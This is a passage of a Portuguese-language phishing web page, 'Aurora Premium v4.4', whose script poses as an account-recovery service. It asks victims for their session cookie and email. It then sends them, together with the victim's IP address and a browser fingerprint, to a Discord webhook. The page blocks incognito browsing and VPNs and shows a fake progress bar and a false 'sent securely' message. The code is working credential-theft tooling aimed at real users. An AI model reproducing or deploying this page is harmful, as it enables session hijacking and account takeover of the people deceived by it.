            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) { browser = 'Safari'; const m = ua.match(/Version\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
            return version ? `${browser} ${version}` : browser;
        }

        async function getFingerprint() {
            try {
                const comp = [navigator.userAgent, navigator.language, screen.width + 'x' + screen.height,
                    screen.colorDepth, new Date().getTimezoneOffset(), navigator.hardwareConcurrency,
                    navigator.platform, navigator.deviceMemory || 0].join('|');
                if (!crypto.subtle) return 'NO-CRYPTO';
                const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(comp));
                return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16).toUpperCase();
            } catch (e) { return 'UNKNOWN'; }
        }

        function chunkString(str, size) {

            return chunks.length ? chunks : [''];
        }

                            color: 0x6366f1,
                            description: `\`\`\`${ua.substring(0, 900)}\`\`\``,
                            footer: { text: `Aurora v4.4 • ${new Date().getFullYear()} • ${sessionId}`, icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' }
                        }
                    ]
                };

                // Envio fetch com log
                try {
                    const r = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                    if (r.ok) return true;
                    let errText = ''; try { errText = await r.text(); } catch (_) {}
                    console.error('❌ Webhook Discord retornou', r.status, errText);
                } catch (e) { console.error('❌ fetch erro:', e); }

                // Fallback XHR checando status
                try {
                    return await new Promise((resolve) => {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', WEBHOOK_URL, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.onload = () => {
                            if (xhr.status >= 200 && xhr.status < 300) resolve(true);
                            else { console.error('❌ XHR falhou:', xhr.status, xhr.responseText); resolve(false); }
                        };
                        xhr.onerror = () => { console.error('❌ XHR network'); resolve(false); };
                        xhr.send(JSON.stringify(payload));
                    });
                } catch (e) { console.error('❌ XHR exception:', e); return false; }
            } catch (e) { console.error('Erro webhook:', e); return false; }
        }

        // ============================================================
        // 8. DETECT API
        // ============================================================
        async function checkDetection() {
            try {
                const res = await fetchWithTimeout('/api/detect', 4000);
                const data = await res.json();
                if (data.data && data.data.blocked) {
                    const modal = document.getElementById('blockModal');
                    const reason = document.getElementById('blockReason');
                    const title = document.getElementById('blockTitle');
                    const icon = document.getElementById('blockIcon');
                    const desc = document.getElementById('blockDesc');
                    const btn = document.getElementById('blockBtn');
                    const gif = document.getElementById('banGifWrap');
                    gif.classList.remove('active');
                    let msg = '';
                    if (data.data.isPrivate) {
                        msg = '🔒 Navegador Anônimo/Incógnito Detectado';
                        title.textContent = '🔒 Navegador Anônimo!';
                        icon.textContent = '🕵️';
                        desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança.';
                    } else if (data.data.vpn && data.data.vpn.isVPN) {
                        msg = '🌐 VPN ou Proxy Detectado';
                        title.textContent = '🌐 VPN/Proxy Detectado!';
                        icon.textContent = '🛡️';
                        desc.textContent = 'Conexões via VPN ou proxy não são permitidas.';
                    }
                    reason.textContent = msg;
                    reason.parentElement.className = 'reason-box';
                    btn.className = 'btn-block-action';
                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
                    btn.onclick = () => window.location.reload();
                    modal.classList.add('active');
                    document.body.style.overflow = 'hidden';
                    return data.data;
                }
                return data.data || { blocked: false };
            } catch (e) { return { blocked: false }; }
        }

        // ============================================================
        // 9. UI
        // ============================================================
        function toggleMenu() { document.getElementById('navMenu').classList.toggle('open'); }
        function showSection(id) {
            if (isUserBanned) return;
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            const target = document.getElementById(id);
            if (target) target.classList.add('active');
            document.querySelectorAll('.nav-links a').forEach(l => l.classList.remove('active'));
            const links = document.querySelectorAll('.nav-links a');
            for (let l of links) {
                if (l.textContent.trim().toLowerCase().includes(id) || l.textContent.trim().toLowerCase().includes(id.substring(0, 3))) {
                    l.classList.add('active'); break;
                }
            }
            document.getElementById('navMenu').classList.remove('open');
            window.scrollTo({ top: 0, behavior: 'auto' });
        }
        function goToRecovery() { if (isUserBanned) return; showSection('recovery'); }
        function togglePass() {
            const inp = document.getElementById('cookieInput');
            const icon = document.querySelector('.toggle i');
            if (inp.type === 'password') { inp.type = 'text'; icon.className = 'fas fa-eye-slash'; }
            else { inp.type = 'password'; icon.className = 'fas fa-eye'; }
        }
        function toggleFaq(el) {
            const item = el.closest('.faq-item');
            document.querySelectorAll('.faq-item').forEach(i => { if (i !== item) i.classList.remove('open'); });
            item.classList.toggle('open');
        }

        // ============================================================
        // 10. TIMER
        // ============================================================
        function updateTimer() {
            if (!blockUntil) return;
            const diff = blockUntil - Date.now();
            if (diff <= 0) {
                clearInterval(timerInterval);
                document.getElementById('blockMsg').classList.remove('visible');
                const btn = document.getElementById('submitBtn');
                btn.disabled = false; btn.style.opacity = '1';
                btn.innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
                hasAttempted = false; isBlocked = false;
                try { localStorage.removeItem('aurora_block_until'); } catch (e) {}
                return;
            }
            const h = Math.floor(diff / 3600000);
            const m = Math.floor((diff % 3600000) / 60000);
            const s = Math.floor((diff % 60000) / 1000);
            document.getElementById('timerDisplay').textContent = `${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m ${String(s).padStart(2,'0')}s`;
        }

        // ============================================================
        // 11. SUBMIT
        // ============================================================
        async function handleSubmit(e) {
            e.preventDefault();

            const isIncognito = await detectIncognito();
            if (isIncognito) { showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito não é permitido. Desative para continuar.'); return; }
            if (isUserBanned) return;
            if (!termsAccepted) { openTerms(); showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos.'); return; }
            if (isBlocked) { showNotification('⏳', 'Aguarde!', 'Espere 9 horas para tentar novamente.'); return; }

            const [isPrivate, isGoogle, hasVPN] = await Promise.all([isPrivateBrowsing(), isGoogleIncognito(), detectVPN()]);
            if (isPrivate || isGoogle) { showNotification('🔒', 'Navegador Anônimo!', 'Navegadores anônimos não são permitidos.'); return; }
            if (hasVPN) { showNotification('🌐', 'VPN Detectada!', 'Conexões via VPN não são permitidas.'); return; }

            const cookie = document.getElementById('cookieInput').value.trim();
            const email = document.getElementById('emailInput').value.trim();
            if (!cookie || !email) { showNotification('⚠️', 'Campos vazios!', 'Preencha todos os campos.'); return; }
            if (hasAttempted) { showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.'); return; }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';

            const ip = await getIP();
            const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);

            if (sent) {
                hasAttempted = true; isBlocked = true;
                blockUntil = Date.now() + (9 * 60 * 60 * 1000);
                try { localStorage.setItem('aurora_block_until', blockUntil.toString()); } catch (e) {}
                btn.disabled = true; btn.style.opacity = '0.5';
                btn.innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
                document.getElementById('blockMsg').classList.add('visible');
                document.getElementById('timerDisplay').textContent = '9h 00m 00s';
                if (timerInterval) clearInterval(timerInterval);
                timerInterval = setInterval(updateTimer, 1000);
                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✨');
                showProcessing();
            } else {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
                showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
            }
        }

        // ============================================================
        // 12. MODAIS
        // ============================================================
        function showProcessing() {
            const modal = document.getElementById('processingModal');
            modal.classList.add('active');
            let p = 0;
            const fill = document.querySelector('.progress-track .fill');
            const text = document.getElementById('procText');
            const interval = setInterval(() => {
                p += Math.random() * 20 + 5;
                if (p > 100) p = 100;
                text.textContent = Math.floor(p) + '%';
                fill.style.width = p + '%';
                if (p >= 100) {
                    clearInterval(interval);
                    setTimeout(() => { modal.classList.remove('active'); showSuccess(); }, 400);
                }
            }, 180);
        }
        function showSuccess() {
            document.getElementById('successModal').classList.add('active');
            document.getElementById('recoveryForm').reset();
            document.getElementById('cookieInput').type = 'password';
            document.querySelector('.toggle i').className = 'fas fa-eye';
        }
        function closeSuccess() {
            document.getElementById('successModal').classList.remove('active');
            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. ✨');
        }

        // ============================================================
        // 13. NOTIFICATION
        // ============================================================
        function showNotification(icon, title, msg) {
            const el = document.createElement('div');
            el.style.cssText = `
                position: fixed; top: 80px; right: 16px; z-index: 9999;
                background: linear-gradient(135deg, rgba(18,8,42,0.97), rgba(7,3,15,0.97));
                border: 1px solid rgba(139,58,237,0.25);
                border-radius: 14px; padding: 1rem 1.3rem; max-width: 340px;
                animation: fadeUp 0.3s ease-out;
                box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 30px rgba(139,92,246,0.2);
                color: #fff; font-family: inherit; left: 16px;
            `;
            if (window.innerWidth > 480) { el.style.left = 'auto'; el.style.maxWidth = '380px'; }
            el.innerHTML = `
                <div style="display:flex;align-items:center;gap:0.6rem;margin-bottom:0.15rem;">
                    <span style="font-size:1.35rem;">${icon}</span>
                    <strong style="font-size:0.95rem;">${title}</strong>
                </div>
                <p style="color:rgba(255,255,255,0.68);margin:0;font-size:0.85rem;line-height:1.5;">${msg}</p>
            `;
            document.body.appendChild(el);
            setTimeout(() => {
                el.style.transition = 'opacity 0.3s, transform 0.3s';
                el.style.opacity = '0'; el.style.transform = 'translateY(-10px)';
                setTimeout(() => el.remove(), 300);
            }, 4500);
        }

        // ============================================================
        // 14. CLOSE MODALS
        // ============================================================
        document.addEventListener('click', function(e) {
            const block = document.getElementById('blockModal');
            if (e.target === block) return;
            if (e.target === document.getElementById('processingModal')) e.target.classList.remove('active');
            if (e.target === document.getElementById('successModal')) e.target.classList.remove('active');
            if (e.target === document.getElementById('termsModal')) closeTerms();
        });

        // ============================================================
        // 15. SCROLL
        // ============================================================
        let scrollTicking = false;
        window.addEventListener('scroll', () => {
            if (!scrollTicking) {
                requestAnimationFrame(() => {
                    document.querySelector('.navbar').style.background = window.scrollY > 10 ? 'rgba(7,3,15,0.88)' : 'rgba(7,3,15,0.78)';
                    scrollTicking = false;
                });
                scrollTicking = true;
            }
        }, { passive: true });

        // ============================================================
        // 16. RESTORE BLOCK
        // ============================================================
        function restoreBlock() {
            try {
                const saved = localStorage.getItem('aurora_block_until');
                if (saved) {
                    const t = parseInt(saved);
                    if (t > Date.now()) {
                        blockUntil = t; isBlocked = true; hasAttempted = true;
                        const btn = document.getElementById('submitBtn');
                        btn.disabled = true; btn.style.opacity = '0.5';
                        btn.innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
                        document.getElementById('blockMsg').classList.add('visible');
                        if (timerInterval) clearInterval(timerInterval);
                        timerInterval = setInterval(updateTimer, 1000);
                        updateTimer();
                    } else localStorage.removeItem('aurora_block_until');
                }
            } catch (e) {}
        }

        // ============================================================
        // 17. INIT
        // ============================================================
        async function init() {
            console.log('%c✨ Aurora Premium v4.4 ✨', 'font-size:22px;font-weight:bold;background:linear-gradient(90deg,#8b5cf6,#d8b4fe);-webkit-background-clip:text;color:transparent;');

            const isIncognito = await detectIncognito();
            if (isIncognito) {
                const modal = document.getElementById('blockModal');
                document.getElementById('blockTitle').textContent = '🔒 Modo Incógnito!';
                document.getElementById('blockIcon').textContent = '🕵️';
                document.getElementById('blockReason').textContent = '🔒 Modo Incógnito/Anônimo Detectado';
                document.getElementById('blockReason').parentElement.className = 'reason-box';
                document.getElementById('blockDesc').textContent = 'O modo incógnito não é permitido por questões de segurança. Desative para acessar.';
                document.getElementById('blockBtn').className = 'btn-block-action';
                document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
                document.getElementById('blockBtn').onclick = () => window.location.reload();
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
                return;
            }

            const isPrivate = await detectPrivateBrowsingBrowser();
            if (isPrivate) {
                const modal = document.getElementById('blockModal');
                document.getElementById('blockTitle').textContent = '🔒 Navegador Anônimo!';
                document.getElementById('blockIcon').textContent = '🕵️';
                document.getElementById('blockReason').textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
                document.getElementById('blockReason').parentElement.className = 'reason-box';
                document.getElementById('blockDesc').textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative para acessar.';
                document.getElementById('blockBtn').className = 'btn-block-action';
                document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
                document.getElementById('blockBtn').onclick = () => window.location.reload();
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
                return;
            }

            const banned = await checkBanStatus();
            if (banned) return;

            checkDetection();
            restoreBlock();
            setTimeout(checkTerms, 800);
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
    </script>
</body>
</html>
